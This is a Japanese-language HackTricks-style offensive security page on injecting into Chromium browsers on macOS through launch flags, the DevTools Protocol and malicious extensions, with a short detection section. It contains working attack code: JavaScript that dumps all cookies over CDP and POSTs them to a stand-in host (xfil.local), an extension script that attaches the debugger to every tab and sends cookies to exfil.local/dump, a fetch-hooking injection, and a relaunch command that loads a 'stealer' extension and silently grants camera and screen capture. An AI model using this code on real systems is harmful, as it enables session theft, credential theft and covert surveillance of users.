# macOS Chromium Injection

{{#include ../../../banners/hacktricks-training.md}}

## 基本情報

Google Chrome、Microsoft Edge、Brave、Arc、Vivaldi、OperaなどのChromiumベースのブラウザは、同じコマンドラインスイッチ、設定ファイル、DevTools automation interfaceをすべて使用します。macOSでは、GUIアクセスを持つユーザーであれば、既存のブラウザセッションを終了し、対象ユーザーのentitlementsで実行される任意のflags、extensions、DevTools endpointsを指定して再起動できます。

#### macOSでcustom flagsを指定してChromiumを起動する

macOSでは、Chromium profileごとに単一のUI instanceが維持されるため、instrumentationには通常、ブラウザを強制終了する必要があります（例: `osascript -e 'tell application "Google Chrome" to quit'`）。Attackersは通常、`open -na "Google Chrome" --args <flags>`で再起動し、app bundleを変更せずにargumentsをinjectします。このコマンドをuser LaunchAgent（`~/Library/LaunchAgents/*.plist`）またはlogin hook内でラップすると、reboot/logoff後に改変されたブラウザが確実にrespawnされます。

#### `--load-extension` Flag

`--load-extension` flagは、unpacked extensions（カンマ区切りのpaths）を自動的にloadします。`--disable-extensions-except`と組み合わせることで、正規のextensionsをブロックし、payloadのみを強制的に実行できます。Malicious extensionsは、`debugger`、`webRequest`、`cookies`などのhigh-impact permissionsを要求し、DevTools protocolsへのpivot、CSP headersのpatch、HTTPSのdowngrade、ブラウザ起動直後のsession materialのexfiltrateを実行できます。

#### `--remote-debugging-port` / `--remote-debugging-pipe` Flags

これらのswitchesは、TCPまたはpipe経由でChrome DevTools Protocol（CDP）を公開し、外部toolingからブラウザを操作できるようにします。Googleはこのinterfaceがinfostealerに広くabuseされていることを確認しており、Chrome 136（2025年3月）以降、browserがnon-standardな`--user-data-dir`で起動されない限り、default profileではこれらのswitchesが無視されます。これにより実際のprofilesではApp-Bound Encryptionがenforceされますが、attackersは新しいprofileをspawnし、その中でvictimにauthenticateさせ（phishing/triage assistance）、CDP経由でcookies、tokens、device trust states、WebAuthn registrationsをharvestできます。

#### `--user-data-dir` Flag

このflagは、ブラウザprofile全体（History、Cookies、Login Data、Preference filesなど）をattacker-controlled pathへredirectします。modern Chrome buildsで`--remote-debugging-port`と組み合わせる場合に必須であり、改変されたprofileをisolateすることで、security promptsをdisableし、extensionsをauto-installし、default schemesを変更する、事前にpopulatedされた`Preferences`または`Secure Preferences` filesを配置できます。

#### `--use-fake-ui-for-media-stream` Flag

このswitchはcamera/mic permission promptをbypassし、`getUserMedia`を呼び出すすべてのpageに即座にaccessを与えます。`--auto-select-desktop-capture-source="Entire Screen"`、`--kiosk`、またはCDPの`Browser.grantPermissions` commandsなどのflagsと組み合わせることで、user interactionなしにaudio/video、desk-shareをsilentにcaptureしたり、WebRTC permission checksを満たしたりできます。

## 実際に確認されているDelivery & Relaunch Patterns

CDP abuseは、initial payloadではなく、一般的に**post-exploitation** stageです。最近のmacOS developer-targeting campaignでは、poisoned Xcode **`Run Script` build phase**（`PBXShellScriptBuildPhase`）が使用され、victimがprojectを単にcloneまたはopenしたときではなく、**build**したときだけcodeが実行されました。最初のexecution後、malwareは他の`.xcodeproj` treesにもinfectし、malicious Git `pre-commit` hooksを追加し、ZIP archivesからさらにXcode projectsをsearchしました。

Chromium abuseで重要なのは、attackerがbrowser binary自体にpatchする必要がない点です。短時間だけ実行されるbuild-phase / `osascript` stagerは、代わりに**browser wrapper**（LaunchAgent、login item、Dock entry、trojanized app launcherなど）をinstallし、userが起動するたびにattacker-controlled flagsを指定してlegitimate browserをreopenできます。

> [!TIP]
> Developer endpointsでは、`.pbxproj` files、`.git/hooks/pre-commit`、および`.xcodeproj`を含むZIPsを確認し、予期しない`curl`、`osascript`、`xxd`、nested `base64`、またはChrome relaunch logicがないか調べてください。

## Remote Debugging & DevTools Protocol Abuse

Chromeを専用の`--user-data-dir`と`--remote-debugging-port`でrelaunchした後は、CDP経由（例: `chrome-remote-interface`、`puppeteer`、`playwright`）でattachし、high-privilege workflowsをscript化できます。

- **Cookie/session theft:** `Network.getAllCookies`と`Storage.getCookies`は、App-Bound encryptionによって通常はfilesystem accessがblockされる場合でも、HttpOnly valuesをreturnします。これはCDPが実行中のブラウザにdecryptを要求するためです。
- **Permission tampering:** `Browser.grantPermissions`と`Emulation.setGeolocationOverride`により、camera/mic promptsをbypassしたり（特に`--use-fake-ui-for-media-stream`との組み合わせ）、location-based security checksをfalsifyしたりできます。
- **Keystroke/script injection:** `Runtime.evaluate`はactive tab内で任意のJavaScriptを実行し、credential lifting、DOM patching、navigation後も存続するpersistence beaconsのinjectを可能にします。
- **Live exfiltration:** `Network.webRequestWillBeSentExtraInfo`と`Fetch.enable`は、disk artifactsに触れることなく、authenticated requests/responsesをリアルタイムでinterceptします。
```javascript
import CDP from 'chrome-remote-interface';

(async () => {
const client = await CDP({host: '127.0.0.1', port: 9222});
const {Network, Runtime} = client;
await Network.enable();
const {cookies} = await Network.getAllCookies();
console.log(cookies.map(c => `${c.domain}:${c.name}`));
await Runtime.evaluate({expression: "fetch('https://xfil.local', {method:'POST', body:document.cookie})"});
await client.close();
})();
```
Chrome 136 は default profile で CDP をブロックするため、被害者が既に使用している `~/Library/Application Support/Google/Chrome` directory を staging path に copy/paste しても、decrypted cookies は得られなくなりました。代わりに、ユーザーを social-engineer して instrumented profile 内で認証させる（例: 「役立つ」support session）か、CDP-controlled network hooks を介して通信中の MFA tokens を capture します。

### XCSSET-style CDP Backdoor Chain

実用的な malware pattern は次のとおりです。

1. Chrome が起動されるたびに、userland implant または wrapper を restart します。
2. `--remote-debugging-port=<port>` と、Chrome 136 以降では通常、ペアとなる non-default `--user-data-dir=<dir>` を指定して legitimate browser を spawn します。
3. local CDP WebSocket に接続し、`Page.addScriptToEvaluateOnNewDocument` を使用して pre-document hook を登録する helper を start します。

この helper は site code が実行される**前**に JavaScript を inject できます。そのため、disk 上の files を patch せずに、`window.fetch`、`XMLHttpRequest`、wallet providers、または autofill flows を hook するのに適しています。
```javascript
await Page.enable();
await Runtime.enable();
await Page.addScriptToEvaluateOnNewDocument({
source: `
const oldFetch = window.fetch;
window.fetch = async (...args) => {
console.log('__HT__' + JSON.stringify(args[0]));
return oldFetch(...args);
};
`
});
Runtime.consoleAPICalled(({args}) => { /* helper parses __HT__ */ });
```
より強力な亜種では、ブラウザーを **host command bridge** に変えます。注入された JavaScript が区切り文字付きの `console.log` を出力し、ローカルヘルパーが `Runtime.consoleAPICalled` を監視してマーカーを削除し、残りの内容を host shell（例: Go の `exec.Command`）経由で実行し、攻撃者の WebSocket に stdout/stderr を返します。これにより、タブレベルの script 実行が、ほぼ fileless な reverse shell に拡張されます。

## Debugger API を介した Extension-Based Injection

2023 年の「Chrowned by an Extension」research では、悪意のある extension が `chrome.debugger` API を使用して任意のタブに attach し、`--remote-debugging-port` と同じ DevTools 権限を取得できることが示されました。これにより、元々想定されていた isolation（extension は自身の context に留まる）が破られ、以下が可能になります。

- `Network.getAllCookies`/`Fetch.getResponseBody` による、ユーザーに気付かれにくい cookie と credential の窃取。
- site permission（camera、microphone、geolocation）の変更と security interstitial の bypass。これにより、phishing page が Chrome のダイアログを偽装できます。
- `Page.handleJavaScriptDialog`、`Page.setDownloadBehavior`、`Security.handleCertificateError` をプログラムから操作することによる、TLS warning、download、または WebAuthn prompt の on-path tampering。

`--load-extension`/`--disable-extensions-except` を使用して extension を load すれば、ユーザーの操作は必要ありません。API を weaponize する最小限の background script は次のようになります。
```javascript
chrome.tabs.onUpdated.addListener((tabId, info) => {
if (info.status !== 'complete') return;
chrome.debugger.attach({tabId}, '1.3', () => {
chrome.debugger.sendCommand({tabId}, 'Network.enable');
chrome.debugger.sendCommand({tabId}, 'Network.getAllCookies', {}, (res) => {
fetch('https://exfil.local/dump', {method: 'POST', body: JSON.stringify(res.cookies)});
});
});
});
```
この extension は `Debugger.paused` events を subscribe して、JavaScript variables の読み取り、inline scripts の patch、または navigation 後も有効な custom breakpoints の設置を行うこともできます。すべてがユーザーの GUI session 内で実行されるため、Gatekeeper と TCC は trigger されません。そのため、この technique はすでに user context で execution を達成した malware に最適です。

## Detection & Hunting

- `--remote-debugging-port`、`--remote-debugging-pipe`、または suspicious な `--user-data-dir` を付けて起動された Chromium browsers を alert します。特に parent が `bash`、`sh`、`osascript`、`xcodebuild`、または LaunchAgent helper の場合は注意します。
- helper が local CDP WebSocket を開き、`Page.addScriptToEvaluateOnNewDocument` を register し、その後 long-lived outbound WebSocket/HTTPS connection を確立する短い chain を探します。
- browser の `Runtime.consoleAPICalled` activity と、attacker-supplied commands を実行する child shells または helper processes を相関させ、console-to-shell bridges を hunt します。
- developer Macs では、`.pbxproj` の `PBXShellScriptBuildPhase` entries、Git の `pre-commit` hooks、Dock/login item relaunchers、および ZIP-contained Xcode projects を確認し、browser wrapper の installation を調査します。
```bash
ps auxww | rg 'Chrome|Brave|Edge.*(--remote-debugging-port|--remote-debugging-pipe|--user-data-dir)'
lsof -nP -iTCP -sTCP:LISTEN | rg 'Chrome|Brave|Edge'
find ~/Library/LaunchAgents /Library/LaunchAgents -name '*.plist' -exec plutil -p {} \; 2>/dev/null | rg 'remote-debugging|Google Chrome|Brave|Edge'
rg -n 'PBXShellScriptBuildPhase|curl|osascript|xxd|base64' ~/Code --glob '*.pbxproj'
```
### ツール

- [https://github.com/breakpointHQ/snoop](https://github.com/breakpointHQ/snoop) - payload extensions を使用した Chromium の起動を自動化し、interactive CDP hooks を公開します。
- [https://github.com/breakpointHQ/VOODOO](https://github.com/breakpointHQ/VOODOO) - macOS operators 向けに、traffic interception と browser instrumentation に特化した類似のツールです。
- [https://github.com/cyrus-and/chrome-remote-interface](https://github.com/cyrus-and/chrome-remote-interface) - `--remote-debugging-port` インスタンスが起動した後、Chrome DevTools Protocol のダンプ（cookies、DOM、permissions）を script 化する Node.js library です。

### 例
```bash
# Launch an instrumented Chrome profile listening on CDP and auto-granting media/capture access
osascript -e 'tell application "Google Chrome" to quit'
open -na "Google Chrome" --args \
--user-data-dir="$TMPDIR/chrome-privesc" \
--remote-debugging-port=9222 \
--load-extension="$PWD/stealer" \
--disable-extensions-except="$PWD/stealer" \
--use-fake-ui-for-media-stream \
--auto-select-desktop-capture-source="Entire Screen"

# Intercept traffic
voodoo intercept -b chrome
```
ツールのリンクでさらに例を確認してください。

## 参考資料

- [https://chromedevtools.github.io/devtools-protocol/v8/Runtime/](https://chromedevtools.github.io/devtools-protocol/v8/Runtime/)
- [https://chromedevtools.github.io/devtools-protocol/tot/Page/](https://chromedevtools.github.io/devtools-protocol/tot/Page/)
- [https://unit42.paloaltonetworks.com/xcsset-v40-malware-analysis/](https://unit42.paloaltonetworks.com/xcsset-v40-malware-analysis/)
- [https://twitter.com/RonMasas/status/1758106347222995007](https://twitter.com/RonMasas/status/1758106347222995007)
- [https://developer.chrome.com/blog/remote-debugging-port](https://developer.chrome.com/blog/remote-debugging-port)
- [https://arxiv.org/abs/2305.11506](https://arxiv.org/abs/2305.11506)

{{#include ../../../banners/hacktricks-training.md}}
